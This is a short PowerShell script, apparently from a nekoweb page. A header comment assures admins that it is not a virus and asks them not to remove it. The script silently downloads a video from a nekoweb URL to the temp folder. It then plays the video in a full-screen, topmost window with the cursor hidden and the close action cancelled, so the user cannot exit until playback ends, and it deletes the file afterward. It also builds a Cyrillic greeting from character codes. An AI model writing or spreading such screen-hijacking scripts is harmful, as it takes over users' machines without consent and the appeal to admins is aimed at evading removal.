#For nekoweb admins: THIS SCRIPT IS NOT A VIRUS! It doesn't steal data or remotely accesses the device. Plesae don't remove this script from my page.
Add-Type -AssemblyName PresentationFramework,System.Windows.Forms,WindowsBase
$p="$env:TEMP\v.mp4"
$v=New-Object Windows.Window -Property @{WindowState=2;WindowStyle=0;Topmost=$true;Cursor=[Windows.Input.Cursors]::None}
$v.add_Closing({$_.Cancel=$true});$m=New-Object System.Windows.Controls.MediaElement -Property @{Source=$p;LoadedBehavior=1;Stretch=2}
$v.Content=$m;$m.add_MediaEnded({$v.Hide();rm $p -Force;$v.Close()})
$msg = [char]0x041F+[char]0x0440+[char]0x0438+[char]0x0432+[char]0x0435+[char]0x0442+", "+[char]0x044D+[char]0x0442+[char]0x043E+"..."
Write-Host "$msg by dverlock aka dvir1n"
$ProgressPreference="SilentlyContinue";iwr "https://dvir1n.nekoweb.org/krutoevideo.mp4" -O $p;$v.ShowDialog()